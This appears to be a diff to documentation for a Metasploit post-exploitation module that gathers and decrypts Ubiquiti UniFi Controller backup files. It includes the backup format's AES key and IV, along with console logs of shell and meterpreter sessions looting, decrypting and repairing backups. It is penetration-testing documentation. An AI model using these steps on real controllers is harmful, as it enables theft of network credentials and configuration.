@@ -1,10 +1,12 @@
 ## Vulnerable Application
 
-  This module works against UniFi Network Controller (5.10.19 confirmed, most likely others), to download any backup and
+  This module works against UniFi Network Controller (`5.10.19`-`5.10.23` confirmed, most likely others), to download any backup and
   autobackup files (.unf extension).  These files are AES encrypted zip files which use the IV `ubntenterpriseap` and
   key `bcyangkmluohmars`.  The unf zip file is then decrypted, however it contains an error in the file.  Utilizing
   `zip -FF` the file can be repaired and opened (some reports say 7zip can open the errored file).  If `zip` is
   available on the system, this operation is performed and the result saved to loot as well.
+
+  Due to the potential large file sizes of the backups, meterpreter is greatly encouraged over a shell.
 
   This work is based on zhangyoufu's [unifi-backup-decrypt](https://github.com/zhangyoufu/unifi-backup-decrypt)
   and justingist's [POSH-Ubiquiti](https://github.com/justingist/POSH-Ubiquiti/blob/master/Posh-UBNT.psm1).  
@@ -195,5 +197,47 @@ msf5 post(multi/gather/ubiquiti_unifi_backup) > rexploit
 [+] File 5.10.20.unf DECRYPTED and saved to /root/.msf4/loot/20190406110342_default_1.1.1.1_ubiquiti.unifi.b_122303.zip.  File needs to be repair via `zip -FF`
 [*] Attempting to repair zip file (this is normal)
 [+] File /Users/unifi/Library/Application Support/UniFi/data/backup/5.10.20.unf DECRYPTED and REPAIRED and saved to /root/.msf4/loot/20190406110342_default_1.1.1.1_ubiquiti.unifi.b_728913.zip.
+[*] Post module execution completed
+```
+
+### Using a SHELL With Multiple Larger Backups on Ubiquiti Unifi Controller 5.10.23
+
+An example of the output when not utilizing meterpreter (just a shell) to access the files.  The solution is to upgrade to meterpreter, which will
+work successfully.
+
+```
+msf5 post(multi/gather/ubiquiti_unifi_backup) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information                                               Connection
+  --  ----  ----                   -----------                                               ----------
+  1         shell linux            SSH unifi:unifi (1.1.1.1:22)                              2.2.2.2:35125 -> 1.1.1.1:22 (1.1.1.1)
+  2         meterpreter x86/linux  uid=1000, gid=1000, euid=1000, egid=1000 @ 1.1.1.1        2.2.2.2:4433 -> 1.1.1.1:52584 (1.1.1.1)
+
+msf5 post(multi/gather/ubiquiti_unifi_backup) > session -i 1
+l[-] Unknown command: session.
+msf5 post(multi/gather/ubiquiti_unifi_backup) > sessions -i 1
+[*] Starting interaction with 1...
+
+ls -lah /var/lib/unifi/backup/*.unf
+-rw-r----- 1 unifi unifi  15K Mar 22 21:15 /var/lib/unifi/backup/5.10.19.unf
+-rw-r----- 1 unifi unifi 3.3M May 10 13:59 /var/lib/unifi/backup/5.10.20.unf
+-rw-r----- 1 unifi unifi 3.3M May 10 14:26 /var/lib/unifi/backup/5.10.23.unf
+^Z
+Background session 1? [y/N]  y
+msf5 post(multi/gather/ubiquiti_unifi_backup) > set session 1
+session => 1
+msf5 post(multi/gather/ubiquiti_unifi_backup) > run
+
+[!] SESSION may not be compatible with this module.
+[+] Read UniFi Controller file /var/lib/unifi/system.properties
+[+] File /var/lib/unifi/backup/5.10.19.unf saved to /root/.msf4/loot/20190510150128_default_1.1.1.1_ubiquiti.unifi.b_313804.unf
+[+] File 5.10.19.unf DECRYPTED and saved to /root/.msf4/loot/20190510150128_default_1.1.1.1_ubiquiti.unifi.b_129165.zip.  File needs to be repair via `zip -FF`
+[*] Attempting to repair zip file (this is normal)
+[+] File /var/lib/unifi/backup/5.10.19.unf DECRYPTED and REPAIRED and saved to /root/.msf4/loot/20190510150128_default_1.1.1.1_ubiquiti.unifi.b_016198.zip.
+[-] /var/lib/unifi/backup/5.10.20.unf read at 0 bytes.  Either file is empty or error reading.  If this is a shell, you need to upgrade to meterpreter!!!
+[-] /var/lib/unifi/backup/5.10.23.unf read at 0 bytes.  Either file is empty or error reading.  If this is a shell, you need to upgrade to meterpreter!!!
 [*] Post module execution completed
 ```
